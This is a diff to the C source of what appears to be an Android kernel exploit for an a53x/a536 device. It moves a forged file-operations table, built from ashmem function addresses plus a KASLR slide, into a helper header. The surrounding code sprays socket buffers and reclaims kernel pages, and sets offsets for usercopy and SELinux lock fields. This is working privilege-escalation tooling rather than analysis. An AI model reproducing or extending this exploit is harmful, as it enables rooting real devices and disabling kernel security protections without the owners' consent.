@@ -18,14 +18,13 @@
 #include <unistd.h>
 
 #include "target.h"
+#include "fops_table.h"
 #include <kernelsnitch/kernelsnitch.h>
 
 #define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
 #define SKB_DATA_HEAD_SIZE 0xe80
 #define SKB_SEND_SIZE (ORDER3_SIZE * 2)
 #define SKB_PAYLOAD_OFFSET SKB_DATA_HEAD_SIZE
-#define FOPS_OFFSET 0x100
-#define FOPS_TABLE_SIZE 0x120
 #define SKB_USERCOPY_LOCK_OFF 0x900
 #define SKB_USERCOPY_VALUE_OFF 0xa00
 #define SKB_SELINUX_LOCK_OFF 0xb00
@@ -455,30 +454,10 @@ static void put64(unsigned char *blob, size_t offset, uint64_t value) {
 }
 
 static void fill_fops(unsigned char *blob, uint64_t slide) {
-  static const struct {
-    size_t offset;
-    uint64_t image;
-  } slots[] = {
-      {0x00, 0},
-      {0x08, ASHMEM_FOPS_08_IMAGE},
-      {0x10, ASHMEM_FOPS_10_IMAGE},
-      {0x18, ASHMEM_FOPS_18_IMAGE},
-      {0x50, ASHMEM_FOPS_50_IMAGE},
-      {0x58, ASHMEM_FOPS_58_IMAGE},
-      {0x60, ASHMEM_FOPS_60_IMAGE},
-      {0x70, ASHMEM_FOPS_70_IMAGE},
-      {0x80, ASHMEM_FOPS_80_IMAGE},
-      {0xc8, ASHMEM_FOPS_C8_IMAGE},
-      {0xe0, ASHMEM_FOPS_E0_IMAGE},
-  };
-  size_t base = SKB_PAYLOAD_OFFSET + FOPS_OFFSET;
+  size_t base = SKB_PAYLOAD_OFFSET + A53X_FOPS_OFFSET;
 
-  memset(blob + base, 0, FOPS_TABLE_SIZE);
-  memset(blob + ORDER3_SIZE + base, 0, FOPS_TABLE_SIZE);
-  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); ++i) {
-    put64(blob, base + slots[i].offset, slots[i].image + slide);
-    put64(blob, ORDER3_SIZE + base + slots[i].offset, slots[i].image + slide);
-  }
+  a53x_write_fops_table(blob, base, slide);
+  a53x_write_fops_table(blob, ORDER3_SIZE + base, slide);
 }
 
 static int spray_skb(int fd, unsigned char *blob) {
@@ -576,7 +555,7 @@ int a536_reclaim_page(uint64_t slide) {
   memcpy(blob + SKB_PAYLOAD_OFFSET, "RMG-CLEAN-PAGE", 14);
   memcpy(blob + ORDER3_SIZE + SKB_PAYLOAD_OFFSET, "RMG-CLEAN-PAGE", 14);
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
-    memset(blob + chunk + SKB_PAYLOAD_OFFSET, 0, FOPS_OFFSET);
+    memset(blob + chunk + SKB_PAYLOAD_OFFSET, 0, A53X_FOPS_OFFSET);
     memset(blob + chunk + SKB_PAYLOAD_OFFSET + SKB_USERCOPY_LOCK_OFF, 0,
            SKB_USERCOPY_VALUE_OFF - SKB_USERCOPY_LOCK_OFF + sizeof(uint64_t));
     memset(blob + chunk + SKB_PAYLOAD_OFFSET + SKB_SELINUX_LOCK_OFF, 0, 0x20);
